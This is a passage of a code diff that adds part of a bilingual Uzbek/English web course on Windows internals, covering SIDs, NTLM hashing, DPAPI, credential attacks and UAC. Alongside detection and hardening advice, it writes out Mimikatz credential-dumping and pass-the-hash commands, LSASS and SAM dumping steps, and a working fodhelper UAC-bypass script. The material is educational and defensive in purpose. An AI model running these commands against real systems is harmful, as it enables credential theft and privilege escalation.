+S-1-5-21-[domen]-501            → Mehmon (RID 501)
+S-1-5-21-[domen]-1000           → Birinchi oddiy foydalanuvchi akkounti
+S-1-5-21-[domen]-1001           → Ikkinchi oddiy foydalanuvchi akkounti
+
+Keng Tarqalgan Taniqli SID lar:
+S-1-1-0    Hamma
+S-1-5-11   Autentifikatsiya Qilingan Foydalanuvchilar
+S-1-5-32-544  BUILTIN\\Administratorlar guruhi
+S-1-5-32-545  BUILTIN\\Foydalanuvchilar guruhi
+S-1-16-4096   Past Yaxlitlik Darajasi
+S-1-16-8192   O'rta Yaxlitlik Darajasi
+S-1-16-12288  Yuqori Yaxlitlik Darajasi
+S-1-16-16384  Tizim Yaxlitlik Darajasi`}</code></pre>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — NTLM Parol Hashlash</h3>
+      <P>Windows parollarni <Term>NTLM hashlari</Term> (NT hashlari ham deyiladi) sifatida saqlaydi. Algoritm:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          {step:"1. Kirish",desc:"Foydalanuvchi paroli ochiq matnda, masalan, 'P@ssw0rd'"},
+          {step:"2. Kodlash",desc:"UTF-16LE kodlashga o'tkazish (kichik-endian 16-bitli Unicode)"},
+          {step:"3. Hash",desc:"UTF-16LE baytlarining MD4 hashini hisoblash → 16-baytli (32 hex belgi) NTLM hash"},
+          {step:"4. Saqlash",desc:"Hash SAM hive da SYSKEY dan olingan kalit bilan shifrlangan holda saqlanadi. Shuningdek LSASS xotirasida hisob ma'lumoti sifatida keshlanadi."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",gap:12,padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",minWidth:60,flexShrink:0,fontWeight:700}}>{item.step}</span>
+            <span style={{fontSize:13,color:"var(--text-1)"}}>{item.desc}</span>
+          </div>
+        ))}
+      </div>
+      <Callout color="var(--c-err)" icon="warning" titleUz="NTLM hashlari Pass-the-Hash uchun parolning o'zi" titleEn="">
+        NTLM autentifikatsiyasi ochiq matn paroli talab qilmaydi — faqat hash talab qiladi. SAM yoki LSASS dan NTLM hashini qo'lga kiritgan hujumchi parolni hech qachon crack qilmasdan o'sha foydalanuvchi sifatida autentifikatsiya qila oladi. Bu <em>Pass-the-Hash (PtH)</em> — Windows muhitida eng halokatli lateral movement texnikalaridan biri.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Foydalanuvchi Profil Tuzilishi</h3>
+      <P>Foydalanuvchi birinchi marta kirganda, Windows <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Users\[foydalanuvchi_nomi]\</code> da <Term>foydalanuvchi profili</Term> yaratadi (<code>C:\Users\Default</code> dan ko'chiriladi).</P>
+      <div style={{overflowX:"auto",marginTop:12}}>
+        <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
+          <thead><tr style={{borderBottom:"1px solid var(--border)"}}>
+            {["Yo'l (C:\\Users\\user\\ ga nisbatan)","Tarkib","Xavfsizlik / Forensik Eslatmalar"].map(h=><th key={h} style={{textAlign:"left",padding:"8px 12px",color:"var(--text-2)",fontWeight:600}}>{h}</th>)}
+          </tr></thead>
+          <tbody>{[
+            ["NTUSER.DAT","Foydalanuvchi registry hive — kirishda HKCU sifatida o'rnatiladi","Run kalitlari, qobiq papkasi yo'llari, MRU ro'yxatlari — muhim forensik artefakt"],
+            ["AppData\\Local","Mashina-mahalliy dastur ma'lumotlari — sinxronlanmaydi","Brauzer keshlari, Vaqtinchalik fayllar, dastur ma'lumotlar bazalari (masalan, Chrome profili)"],
+            ["AppData\\Roaming","Domen muhitida sinxronlanadi (roaming profili)","Windows hisob ma'lumotlari XML, SSH kalitlari, Outlook profillari, ko'p dastur konfiguratsiyalari"],
+            ["AppData\\LocalLow","Past yaxlitlikdagi jarayon dastur ma'lumotlari","IE/Edge sandbox ma'lumotlari, himoyalangan rejim plaginlar ma'lumotlari"],
+            ["AppData\\Local\\Microsoft\\Credentials","DPAPI bilan shifrlangan hisob ma'lumotlari bloblari","Saqlangan parollar (Hisob Ma'lumotlari Menejeri, IE saqlangan parollar, WiFi kalitlari)"],
+            ["AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","PowerShell buyruq tarixi","Hujumchi buyruqlari — muhim forensik topilma"],
+            ["Desktop, Documents, Downloads","Foydalanuvchi fayllari","Zararli dastur tashlab ketish zonasi — kutilmagan EXE/skriptlarni tekshiring"],
+          ].map((r,i)=><tr key={i} style={{borderBottom:"1px solid rgba(255,255,255,0.04)",background:i%2===0?"transparent":"rgba(255,255,255,0.015)"}}>
+            {r.map((c,j)=><td key={j} style={{padding:"7px 12px",color:j===0?"var(--accent)":"var(--text-1)",fontFamily:j===0?"var(--font-mono)":"inherit",fontSize:j===0?10:13}}>{c}</td>)}
+          </tr>)}
+          </tbody>
+        </table>
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — DPAPI (Ma'lumotlarni Himoya Qilish API)</h3>
+      <P><Term>DPAPI</Term> — Windows ning o'rnatilgan sir himoya mexanizmi. U bloblarni foydalanuvchi parolidan olingan <em>master kalit</em> yordamida shifrlaydi. Kalit hech qachon ochiq matnda mashina tashqarisiga chiqmaydi. DPAPI quyidagilarni himoya qiladi: Hisob Ma'lumotlari Menejeri bloblari, Chrome/Edge saqlangan parollar, WiFi PSK kalitlari, sertifikat shaxsiy kalitlari.</P>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Hisob Ma'lumotlari Hujum Texnikalari</h3>
+      <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
+        {[
+          {title:"SAM + SYSTEM Chiqarish (Oflayn)",color:"var(--c-attack)",body:<>SAM hive SYSTEM hive dan olingan kalit bilan shifrlangan. Ikkalasini chiqarish: <code>reg save HKLM\SAM sam.hiv</code> va <code>reg save HKLM\SYSTEM system.hiv</code> (admin talab qiladi). Keyin barcha NTLM hashlarini oflayn chiqarish uchun <code>secretsdump.py -sam sam.hiv -system system.hiv LOCAL</code> (Impacket). Aniqlash: reg save EventID 4663 + g'ayritabiiy yo'lda yaratilgan katta registry fayli.</>},
+          {title:"LSASS Xotira Damping",color:"var(--c-err)",body:<>LSASS barcha kirgan foydalanuvchilarning hisob ma'lumotlarini xotirada saqlaydi: NTLM hashlari, Kerberos chiptalar, ochiq matn (WDigest, meros). Hujum: <code>procdump -ma lsass.exe lsass.dmp</code> yoki Vazifa Menejeri → Dump yaratish → Mimikatz bilan ochish. Aniqlash: Sysmon Event 10 (PROCESS_VM_READ bilan lsass.exe ga ProcessAccess). PPL + Credential Guard kamaytirishlar.</>},
+          {title:"Pass-the-Hash (PtH)",color:"var(--c-warn)",body:<>Ochiq matn paroli olmadan autentifikatsiya qilish uchun qo'lga kiritilgan NTLM hashini ishlatish: Mimikatz <code>sekurlsa::pth /user:admin /ntlm:HASH /domain:maqsad</code>. NTLM autentifikatsiyasi faqat hash talab qilganligi uchun ishlaydi, parol emas. Kamaytirishlar: LAPS (tasodifiy mahalliy admin parollari), Credential Guard (LSASS dan NTLM hashini olib tashlaydi), Protected Users xavfsizlik guruhi (NTLM ni o'chiradi).</>},
+          {title:"Hisob Ma'lumotlari Menejerini Chiqarish",color:"var(--c-system)",body:<>Windows saqlangan hisob ma'lumotlarini (RDP parollar, tarmoq almashishlari, veb-sayt loginlari) Hisob Ma'lumotlari Menejerida DPAPI bilan shifrlangan holda saqlaydi. Chiqarish: <code>cmdkey /list</code> (saqlangan hisob ma'lumotlarini ro'yxatga olish), Mimikatz <code>dpapi::cred</code>, yoki PowerShell veb hisob ma'lumotlari uchun <code>[Windows.Security.Credentials.PasswordVault]::new().RetrieveAll()</code>. Brauzer parollari ham DPAPI himoyalangan — SharpChrome kabi vositalar ularni chiqaradi.</>},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"14px 16px",borderRadius:10,background:`${item.color}08`,border:`1px solid ${item.color}30`}}>
+            <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:item.color,marginBottom:8}}>{item.title}</div>
+            <div style={{fontSize:13,color:"var(--text-1)",lineHeight:1.65}}>{item.body}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Amaliy Buyruqlar</h3>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Mahalliy foydalanuvchilar va guruhlarni ro'yxatga olish
+net user
+net user Administrator
+Get-LocalUser | Select Name, Enabled, PasswordLastSet, LastLogon
+Get-LocalGroupMember Administrators
+
+# SID qidirish
+whoami /user
+Get-LocalUser | Select Name, SID
+wmic useraccount get name,sid
+
+# Profil joylashuvlari
+Get-ChildItem C:\\Users
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
+
+# LM hashlari o'chirilganligini tekshirish (1 bo'lishi kerak)
+reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash
+
+# NTLM hashini Python da hisoblash
+python3 -c "import hashlib; print(hashlib.new('md4','P@ssw0rd'.encode('utf-16-le')).hexdigest())"
+
+# Mimikatz (Admin kerak)
+sekurlsa::logonpasswords    # LSASS hisob ma'lumotlarini dumplash
+lsadump::sam                # SAM hashlarini dumplash
+dpapi::cred /in:"%appdata%\\Microsoft\\Credentials\\[blob]"`}</code></pre>
+    </section>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────
+function SectionUAC() {
+  const lang = useLang();
+  return lang === "en" ? (
+    <section>
+      <H2 num="§1" en="User Account Control (UAC)" uz="" />
+      <P><Term>UAC (User Account Control)</Term>, introduced in Windows Vista, is a privilege-separation mechanism that forces even administrator users to run with standard-user privileges by default. Only when elevated privileges are explicitly required does UAC prompt for approval. Microsoft's goal: limit the blast radius of malware that executes under an admin account — if the malware runs at medium integrity, it cannot silently install drivers, modify system files, or touch other users' data without triggering a visible prompt.</P>
+      <Callout color="var(--c-warn)" icon="info" titleEn="UAC is not a security boundary" titleUz="">
+        Microsoft officially classifies UAC as a <em>convenience feature</em>, not a security boundary. An admin-level user can always bypass UAC given physical access or enough persistence. The goal is raising the cost, not making bypass impossible. Many bypass techniques exist and are actively exploited.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — The Split Token Model</h3>
+      <P>When an administrator logs in, Windows creates <Em>two tokens</Em> from a single logon session:</P>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:14,marginTop:12}}>
+        <div style={{padding:"16px",borderRadius:10,background:"rgba(0,212,255,0.06)",border:"1px solid rgba(0,212,255,0.25)"}}>
+          <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:"var(--c-system)",marginBottom:10}}>FILTERED TOKEN (Default)</div>
+          <ul style={{margin:0,padding:"0 0 0 16px",fontSize:13,color:"var(--text-1)",lineHeight:1.8}}>
+            <li>Integrity Level: <strong>Medium (0x2000)</strong></li>
+            <li>Admin groups removed from token (Administrators group marked as deny-only)</li>
+            <li>Dangerous privileges removed: SeDebugPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege, etc.</li>
+            <li>Used by all processes by default — Explorer, Chrome, Word</li>
+            <li>Cannot write to HKLM, Program Files, or system files</li>
+          </ul>
+        </div>
+        <div style={{padding:"16px",borderRadius:10,background:"rgba(255,58,94,0.06)",border:"1px solid rgba(255,58,94,0.25)"}}>
+          <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:"var(--c-err)",marginBottom:10}}>ELEVATED TOKEN (On demand)</div>
+          <ul style={{margin:0,padding:"0 0 0 16px",fontSize:13,color:"var(--text-1)",lineHeight:1.8}}>
+            <li>Integrity Level: <strong>High (0x3000)</strong></li>
+            <li>Full admin group membership active</li>
+            <li>All privileges present: SeDebugPrivilege, SeTcbPrivilege, etc.</li>
+            <li>Only created after UAC consent/credential prompt</li>
+            <li>Can write to HKLM, system files, install drivers</li>
+          </ul>
+        </div>
+      </div>
+      <P style={{marginTop:14}}>The two tokens are <Em>linked</Em> — they share the same logon session ID (LUID). This linkage is what auto-elevation exploits: a process with the filtered token can request elevation through the AppInfo service, which finds the linked elevated token and uses it to spawn a new elevated process.</P>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Integrity Levels</h3>
+      <P>Every process and object has a <Term>Mandatory Integrity Control (MIC)</Term> label — a SID appended to the token or ACL. The kernel enforces a no-write-up / no-read-down policy:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:4,marginTop:12}}>
+        {[
+          {il:"Untrusted (0x0000)",sid:"S-1-16-0",color:"#888",who:"Processes with explicit Untrusted label. Cannot write to anything above Untrusted."},
+          {il:"Low (0x1000)",sid:"S-1-16-4096",color:"#b48cff",who:"Internet Explorer / Edge protected mode, sandboxed processes, downloaded files. Can only write to Low-labeled locations (AppData\\LocalLow, browser download directories)."},
+          {il:"Medium (0x2000)",sid:"S-1-16-8192",color:"var(--c-system)",who:"Default for standard users AND filtered admin token. Most user processes. Cannot write to High-labeled resources."},
+          {il:"Medium-Plus (0x2100)",sid:"S-1-16-8448",color:"var(--c-warn)",who:"Used by some specific Windows components. Rarely seen in practice."},
+          {il:"High (0x3000)",sid:"S-1-16-12288",color:"var(--c-err)",who:"Elevated admin processes (after UAC approval). Can modify system files, registry HKLM, install services."},
+          {il:"System (0x4000)",sid:"S-1-16-16384",color:"#ff3a5e",who:"System services running as SYSTEM. Can access and modify anything. Unrestricted."},
+          {il:"Protected Process (0x5000)",sid:"S-1-16-20480",color:"#ff9145",who:"PPL (Protected Process Light) — LSASS when PPL-protected, anti-malware services. Even SYSTEM cannot open with VM_READ."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",alignItems:"flex-start",gap:12,padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <div style={{minWidth:200,flexShrink:0}}>
+              <div style={{fontFamily:"var(--font-mono)",fontSize:11,color:item.color,fontWeight:700}}>{item.il}</div>
+              <div style={{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--text-3)"}}>{item.sid}</div>
+            </div>
+            <span style={{fontSize:12,color:"var(--text-1)",lineHeight:1.6}}>{item.who}</span>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — UAC Architecture: consent.exe and AppInfo</h3>
+      <P>When an elevation request is triggered, the flow is:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          "User double-clicks an installer or right-clicks 'Run as administrator'",
+          "ShellExecute detects the requestedExecutionLevel in the PE manifest (or no manifest = default prompting rules)",
+          "Request sent to AppInfo service (svchost -k netsvcs / AIS) via RPC",
+          "AppInfo validates: is the binary signed? Is it in a trusted directory? Does it have autoElevate in manifest?",
+          "AppInfo calls consent.exe on the secure desktop (a separate desktop object, inaccessible to normal processes)",
+          "consent.exe renders the UAC dialog. User clicks Yes or enters credentials.",
+          "AppInfo creates a new process with the elevated token. The original process continues with filtered token.",
+        ].map((step,i)=>(
+          <div key={i} style={{display:"flex",gap:12,alignItems:"flex-start",padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)",minWidth:20,flexShrink:0}}>{i+1}.</span>
+            <span style={{fontSize:13,color:"var(--text-1)"}}>{step}</span>
+          </div>
+        ))}
+      </div>
+      <Callout color="var(--c-system)" icon="info" titleEn="Secure Desktop protects against UI spoofing" titleUz="">
+        consent.exe runs on the <em>secure desktop</em> — a separate Windows desktop object that only SYSTEM can write to. A Medium-integrity malware cannot draw windows on the secure desktop, inject mouse clicks into it, or intercept keyboard input. This is why the UAC prompt can be trusted visually, even if the system is compromised at Medium IL.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Auto-Elevation</h3>
+      <P>Some Windows binaries elevate silently without showing a UAC prompt. They must meet ALL three criteria:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          {crit:"1. Signed by Microsoft",detail:"The binary must have a valid Authenticode signature from Microsoft Corporation. Third-party signed binaries never auto-elevate."},
+          {crit:"2. Trusted directory",detail:"The binary must live in a protected directory: %SystemRoot%\\System32\\, %SystemRoot%\\, or %ProgramFiles%\\. Directories that require admin to write to — this prevents dropping a fake binary there."},
+          {crit:"3. autoElevate manifest",detail:"The application manifest (embedded in the PE or in a side-by-side .manifest file) must contain <autoElevate>true</autoElevate> inside the requestedExecutionLevel element."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",gap:14,padding:"10px 14px",borderRadius:8,background:"rgba(0,212,255,0.04)",border:"1px solid rgba(0,212,255,0.2)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--c-system)",minWidth:160,flexShrink:0,fontWeight:700}}>{item.crit}</span>
+            <span style={{fontSize:13,color:"var(--text-1)",lineHeight:1.6}}>{item.detail}</span>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — UAC Bypass Techniques</h3>
+      <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
+        {[
+          {title:"Registry Hijacking — fodhelper.exe (UACME #41)",color:"var(--c-attack)",body:<><code>fodhelper.exe</code> is a Microsoft-signed binary in System32 with autoElevate. It reads <code>HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</code> to find the handler for the ms-settings protocol. Since HKCU is user-writable (no elevation needed), the attacker writes their payload there, then launches fodhelper.exe — it auto-elevates and executes the payload at High integrity. Fix: create the registry key yourself and set it to something harmless; or set ConsentPromptBehaviorAdmin=2 (always prompt). Detection: Sysmon Event 13 (registry set under HKCU\\Software\\Classes\\ms-settings) followed by Event 1 (fodhelper.exe spawning unexpected child).</>},
+          {title:"Environment Variable Hijacking — SilentCleanup",color:"var(--c-err)",body:<><code>SilentCleanup</code> is a scheduled task that runs as the current user with RunLevel=HighestAvailable (auto-elevated without prompt). It executes <code>%windir%\\system32\\cleanmgr.exe</code>. If %windir% is overridden via the user-level environment variable (writable without elevation), the task runs the attacker's binary instead. Demonstrated by UACME. Detection: Sysmon Event 1 showing SilentCleanup or schtasks spawning a process from a non-System32 path; user-level %windir% modification.</>},
+          {title:"Eventvwr.exe Registry Hijack",color:"var(--c-warn)",body:<><code>eventvwr.exe</code> is auto-elevated and reads <code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code> to find mmc.exe (for Event Viewer). Attacker writes payload to that HKCU key, launches eventvwr.exe — payload executes at High IL. This was the technique used in many early Metasploit UAC bypass modules. Detection: registry write to HKCU\\Software\\Classes\\mscfile followed by eventvwr.exe execution.</>},
+          {title:"COM Object Elevation (ICMLuaUtil)",color:"var(--c-system)",body:<>Several COM objects are registered with explicit elevation moniker <code>Elevation:Administrator!new:{"{CLSID}"}</code>. These COM objects auto-elevate when instantiated through the COM elevation moniker. ICMLuaUtil interface (CLSID {"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"}) exposes <code>ShellExec</code> and <code>SetRegistryStringValue</code> methods that run at High IL. Callable from Medium IL without any UAC prompt.</>},
+          {title:"DLL Hijacking in Auto-Elevated Process",color:"var(--c-warn)",body:<>Auto-elevated processes that load DLLs by name from user-writable directories (e.g., CWD) are vulnerable. If an attacker can write a malicious DLL to a location searched before System32, the DLL loads at High integrity inside the auto-elevated process. Classic: older versions of cleanmgr.exe loaded cscui.dll from CWD. Detection: Process Monitor showing NAME NOT FOUND DLL loads from auto-elevated processes.</>},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"14px 16px",borderRadius:10,background:`${item.color}08`,border:`1px solid ${item.color}30`}}>
+            <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:item.color,marginBottom:8}}>{item.title}</div>
+            <div style={{fontSize:13,color:"var(--text-1)",lineHeight:1.65}}>{item.body}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — UAC Configuration Settings</h3>
+      <div style={{overflowX:"auto",marginTop:12}}>
+        <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
+          <thead><tr style={{borderBottom:"1px solid var(--border)"}}>
+            {["Registry Value","Key","Meaning"].map(h=><th key={h} style={{textAlign:"left",padding:"8px 12px",color:"var(--text-2)",fontWeight:600}}>{h}</th>)}
+          </tr></thead>
+          <tbody>{[
+            ["ConsentPromptBehaviorAdmin","HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","0=no prompt; 1=credential on secure desktop; 2=consent on secure desktop (default); 3=credential (not secure desktop); 4=consent (not secure desktop); 5=prompt only for non-Windows binaries (most common default)"],
+            ["ConsentPromptBehaviorUser","Same key","0=auto-deny; 1=credential on secure desktop; 3=credential prompt"],
+            ["EnableLUA","Same key","0=UAC completely disabled (dangerous); 1=UAC enabled (default). Disabling removes token splitting — all admin processes run with full token."],
+            ["LocalAccountTokenFilterPolicy","HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","1=disable UAC filtering for remote connections (allows pass-the-hash lateral movement with admin account — enable with caution)"],
+            ["PromptOnSecureDesktop","Same key","0=show prompt on interactive desktop (can be spoofed); 1=show on secure desktop (default)"],
+          ].map((r,i)=><tr key={i} style={{borderBottom:"1px solid rgba(255,255,255,0.04)",background:i%2===0?"transparent":"rgba(255,255,255,0.015)"}}>
+            {r.map((c,j)=><td key={j} style={{padding:"7px 12px",color:j===0?"var(--accent)":"var(--text-1)",fontFamily:j===0?"var(--font-mono)":"inherit",fontSize:j===0?11:13}}>{c}</td>)}
+          </tr>)}
+          </tbody>
+        </table>
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Practical Commands</h3>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check current process integrity level
+whoami /groups | findstr "Mandatory Label"
+# → Mandatory Label\\High Mandatory Level = elevated
+# → Mandatory Label\\Medium Mandatory Level = not elevated
+
+# Check UAC configuration
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
+
+# Find auto-elevated binaries (check manifests)
+# PowerShell: look for autoElevate in System32 manifests
+Get-ChildItem C:\\Windows\\System32\\*.exe | ForEach-Object {
+  $m = [xml](sigcheck.exe -m $_.FullName 2>$null)
+  if ($m -and $m.assembly.trustInfo.security.requestedPrivileges.requestedExecutionLevel.autoElevate -eq 'true') {
+    $_.Name
+  }
+}
+
+# fodhelper UAC bypass (test in lab only)
+New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force
+Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
+  -Name "(default)" -Value "cmd.exe"
+Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" \`
+  -Name "DelegateExecute" -Value ""
+Start-Process "C:\\Windows\\System32\\fodhelper.exe"
+
+# Detection: check for unexpected high-integrity processes
+Get-Process | ForEach-Object {
+  try {
+    $tok = $_.OpenProcessToken([System.Security.Principal.TokenAccessLevels]::Query)
+    # check integrity level
+  } catch {}
+}
+
+# Harden: set UAC to always prompt (level 2)
+Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" \`
+  -Name ConsentPromptBehaviorAdmin -Value 2`}</code></pre>
+    </section>
+  ) : (
+    <section>
+      <H2 num="§1" uz="UAC — Foydalanuvchi Hisobi Nazorati" en="" />
+      <P>Windows Vista da joriy etilgan <Term>UAC (User Account Control)</Term> — hatto administrator foydalanuvchilarini ham standart foydalanuvchi imtiyozlari bilan ishlashga majburlaydi. Faqat ko'tarilgan imtiyozlar aniq talab qilinganida UAC tasdiqlash so'raydi. Microsoft maqsadi: admin akkaunti ostida bajariladigan zararli dasturning ta'sir doirasini cheklash — agar zararli dastur o'rta yaxlitlikda ishlasa, u ko'rinadigan so'rovni ishga tushirmasdan drayverlarni jimgina o'rnata olmaydi, tizim fayllarini o'zgartira olmaydi.</P>
+      <Callout color="var(--c-warn)" icon="info" titleUz="UAC xavfsizlik chegarasi emas" titleEn="">
+        Microsoft UAC ni rasman <em>qulaylik xususiyati</em> sifatida tavsiflaydi, xavfsizlik chegarasi emas. Admin darajasidagi foydalanuvchi jismoniy kirish yoki etarli persistenslik bilan har doim UAC ni chetlab o'ta oladi. Ko'p chetlab o'tish texnikalari mavjud va faol ekspluatatsiya qilinadi.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Ajratilgan Token Modeli</h3>
+      <P>Administrator kirganida, Windows bitta kirish seansidan <Em>ikki token</Em> yaratadi:</P>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:14,marginTop:12}}>
+        <div style={{padding:"16px",borderRadius:10,background:"rgba(0,212,255,0.06)",border:"1px solid rgba(0,212,255,0.25)"}}>
+          <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:"var(--c-system)",marginBottom:10}}>FILTRLANGAN TOKEN (Standart)</div>
+          <ul style={{margin:0,padding:"0 0 0 16px",fontSize:13,color:"var(--text-1)",lineHeight:1.8}}>
+            <li>Yaxlitlik Darajasi: <strong>O'rta (0x2000)</strong></li>
+            <li>Admin guruhlari tokendan olib tashlangan</li>
+            <li>Xavfli imtiyozlar olib tashlangan: SeDebugPrivilege, SeTcbPrivilege va h.k.</li>
+            <li>Standart bo'yicha barcha jarayonlar tomonidan ishlatiladi — Explorer, Chrome, Word</li>
+            <li>HKLM, Program Files yoki tizim fayllariga yoza olmaydi</li>
+          </ul>
+        </div>
+        <div style={{padding:"16px",borderRadius:10,background:"rgba(255,58,94,0.06)",border:"1px solid rgba(255,58,94,0.25)"}}>
+          <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:"var(--c-err)",marginBottom:10}}>KO'TARILGAN TOKEN (Talab bo'yicha)</div>
+          <ul style={{margin:0,padding:"0 0 0 16px",fontSize:13,color:"var(--text-1)",lineHeight:1.8}}>
+            <li>Yaxlitlik Darajasi: <strong>Yuqori (0x3000)</strong></li>
+            <li>To'liq admin guruhi a'zoligi faol</li>
+            <li>Barcha imtiyozlar mavjud: SeDebugPrivilege, SeTcbPrivilege va h.k.</li>
+            <li>Faqat UAC rozilik/hisob ma'lumotlari so'rovidan keyin yaratiladi</li>
+            <li>HKLM, tizim fayllariga yoza oladi, drayver o'rnata oladi</li>
+          </ul>
+        </div>
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Yaxlitlik Darajalari (Integrity Levels)</h3>
+      <P>Har bir jarayon va ob'ektda <Term>Majburiy Yaxlitlik Nazorati (MIC)</Term> belgisi mavjud — tokenga yoki ACL ga qo'shimcha SID. Kernel yozmaslik-yuqoriga / o'qimaslik-pastga siyosatini amalga oshiradi:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:4,marginTop:12}}>
+        {[
+          {il:"Ishonchsiz (0x0000)",sid:"S-1-16-0",color:"#888",who:"Aniq Ishonchsiz yorliq bilan jarayonlar. Ishonchsizdan yuqoriga hech narsaga yoza olmaydi."},
+          {il:"Past (0x1000)",sid:"S-1-16-4096",color:"#b48cff",who:"Internet Explorer / Edge himoyalangan rejimi, sandboxlangan jarayonlar, yuklangan fayllar. Faqat Past belgilangan joylarga (AppData\\LocalLow, brauzer yuklab olish kataloglari) yoza oladi."},
+          {il:"O'rta (0x2000)",sid:"S-1-16-8192",color:"var(--c-system)",who:"Standart foydalanuvchilar VA filtrlangan admin token uchun standart. Ko'p foydalanuvchi jarayonlari. Yuqori belgilangan resurslarga yoza olmaydi."},
+          {il:"Yuqori (0x3000)",sid:"S-1-16-12288",color:"var(--c-err)",who:"Ko'tarilgan admin jarayonlari (UAC tasdiqlashidan keyin). Tizim fayllarini, registry HKLM ni o'zgartirishi, xizmatlar o'rnatishi mumkin."},
+          {il:"Tizim (0x4000)",sid:"S-1-16-16384",color:"#ff3a5e",who:"SYSTEM sifatida ishlaydigan tizim xizmatlari. Hamma narsaga kira oladi va o'zgartira oladi. Cheksiz."},
+          {il:"Himoyalangan Jarayon (0x5000)",sid:"S-1-16-20480",color:"#ff9145",who:"PPL (Himoyalangan Jarayon Light) — PPL himoyalangan LSASS, antizararli xizmatlar. Hatto SYSTEM ham VM_READ bilan ocha olmaydi."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",alignItems:"flex-start",gap:12,padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <div style={{minWidth:180,flexShrink:0}}>
+              <div style={{fontFamily:"var(--font-mono)",fontSize:11,color:item.color,fontWeight:700}}>{item.il}</div>
